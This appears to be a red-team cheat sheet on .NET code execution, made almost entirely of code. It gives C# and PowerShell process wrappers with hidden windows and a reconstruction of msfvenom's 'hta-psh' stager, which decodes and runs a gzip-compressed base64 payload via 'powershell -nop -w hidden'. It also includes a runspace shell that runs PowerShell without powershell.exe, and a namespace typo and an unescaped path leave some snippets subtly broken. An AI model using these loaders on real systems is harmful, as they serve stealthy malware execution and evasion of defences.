# DotNET

## Wrapper

### C\#

```cs
using System.Diagnostics;

class Program {
    static void Main() {
        Execute("<commands>");
    }

	static void Execute(string commands) {
		Process.Start(commands);
	}
}
```

```cs
using System.Diagnostics;

namespace Execution {
    class Program {
	    static void Main(string[] args) {
		    Execute("C:\\path\to\program.exe", "<arguments>");
	    }

        static void Execute(string command, string arguments) {
            Process process = new Process();
            ProcessStartInfo process_Info = new ProcessStartInfo(command, arguments);
            process_Info.CreateNoWindow = true;
            process.StartInfo = process_Info;
            process.Start();
        }
    }
}
```

### PowerShell

```powershell
function Execute([string] $command, [string] $arguments) {
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $command
    $process.StartInfo.Arguments = $arguments
	$process.StartInfo.LoadUserProfile = $false
	$process.StartInfo.UseShellExecute = $true
	$process.StartInfo.CreateNoWindow = $true
	$process.StartInfo.WorkingDirectory = (Get-Location).Path

    $process.Start()
    $process.WaitForExit()
}
```

This is a de-staged PowerShell payload inside `hta-psh` in `msfvenom`. The placeholder contains compressed `gzip` with encoded base64 payload which is the final stage of `psh-reflection` payload format.

```powershell
if ([IntPtr]::Size -eq 4) {
    $command = $env:windir + '\sysnative\WindowsPowerShell\v1.0\powershell.exe'
} else {
    $command = 'powershell.exe'
}

$processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
$processStartInfo.FileName = $command
$processStartInfo.Arguments = '-nop -w hidden -c &' +
    '([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(' +
    '(New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String("<base64_compressed_payload>"))),' +
    '[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'

$processStartInfo.UseShellExecute = $false
$processStartInfo.RedirectStandardOutput = $true
$processStartInfo.WindowStyle = 'Hidden'
$processStartInfo.CreateNoWindow = $true

$process = [System.Diagnostics.Process]::Start($processStartInfo)
```

## Runspace

### C\#

```cs
using System;
using System.Collection.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace AwesomerShell {
    class Program {
        static void Main(string[] args) {
            Console.Write("aps> ");
            string cmd = Console.ReadLine();

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);

            Collection<PSObject> output = ps.Invoke();
            if (output != null) {
                foreach (PSObject rtnItem in output) {
                    Console.WriteLine(rtnItem.ToString());
                }
            }

            rs.Close();
            Console.Write("Press any key to exit.");
            Console.ReadLine();
        }
    }
}
```

---
## References

### Ben0xA

- [Ben0xA: Gray Hat PowerShell Ben Ten](https://www.youtube.com/watch?v=893NGtZlod8)